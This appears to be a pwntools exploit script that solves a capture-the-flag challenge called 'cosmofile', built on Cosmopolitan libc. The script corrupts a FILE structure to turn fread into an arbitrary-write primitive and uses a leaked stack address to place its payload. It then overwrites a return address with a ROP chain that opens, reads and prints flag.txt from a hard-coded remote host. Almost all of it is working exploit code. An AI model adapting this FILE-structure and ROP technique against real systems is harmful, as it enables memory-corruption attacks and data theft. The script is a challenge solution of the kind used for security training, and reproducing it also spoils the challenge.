#!/usr/bin/env python3

from pwn import *

"""
    refer to this: https://github.com/jart/cosmopolitan/blob/master/libc/stdio/internal.h#L15
    exploit strategy:
        1. overwrite  FILE structure to control the condition for fread() call readv() internally
            refer: https://github.com/jart/cosmopolitan/blob/master/libc/stdio/fread_unlocked.c#L82
        2. user option with 1 to trigger that function call
    after that we can arbw for target address, then we can ROP for ret2syscall
"""

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

elf = context.binary = ELF("./dist/cosmofile", checksec=False)
libc = elf.libc


def start(*pargs, **kwargs):
    if args.REMOTE:
        return remote("34.45.81.67", 16005)
    if args.GDB:
        return elf.debug(gdbscript="b *menu+0x30\ncontinue", *pargs, **kwargs)
    return elf.process(*pargs, **kwargs)


io = start(aslr=False)


def file_struct_trimmed(
    bufmode=0,
    freebit=0,
    freebuf=0,
    forking=0,
    oflags=0,
    state=0,
    fd=0,
    pid=0,
    refs=0,
    size=0,
    beg=0,
    end=0,
    buf=0,
):
    file_struct = b""
    file_struct += p8(bufmode)
    file_struct += p8(freebit)
    file_struct += p8(freebuf)
    file_struct += p8(forking)
    file_struct += p32(oflags)
    file_struct += p32(state)
    file_struct += p32(fd)
    file_struct += p32(pid)
    file_struct += p32(refs)
    file_struct += p32(size)
    file_struct += p32(beg)
    file_struct += p32(end)
    file_struct += b"\x00" * 4
    file_struct += p64(buf)

    return file_struct


def arb_write(addr: int, content: bytes):
    io.sendlineafter(b"> ", b"7238770")  # overwrite FILE struct
    io.recvlines(2)  # skip hint messages

    # _IOFBF and size > user request
    fs = file_struct_trimmed(
        bufmode=0, oflags=0, fd=0, size=0x1000 + len(content), beg=0, end=0, buf=addr
    )

    io.send(fs)

    io.sendlineafter(b"> ", b"1")
    io.recvline()
    io.send(cyclic(0x1000) + content)


io.sendlineafter(b"> ", b"1")
io.recvuntil(b"not here...")

raw_leak = io.recvline()
stack_leak = u64(raw_leak[2613 : 2613 + 8])

print(f"stack leak @ {hex(stack_leak)}")

menu_ret = stack_leak - 0x7FFFFFFFDB10 + 0x7FFFFFFFCBE8

# we can't just execve('/bin/sh') due to docker settings

rop = ROP(elf)

write_space = 0x42F010  # just some random addr in writable space

arb_write(write_space, b"flag.txt\x00")
rop.call("open", [write_space, 0])
rop.call("read", [4, write_space + 0x10, 100])
rop.call("write", [1, write_space + 0x10, 100])
rop.call("exit", [0])  # debug reason

chain = rop.chain()

arb_write(menu_ret, chain)

io.interactive()
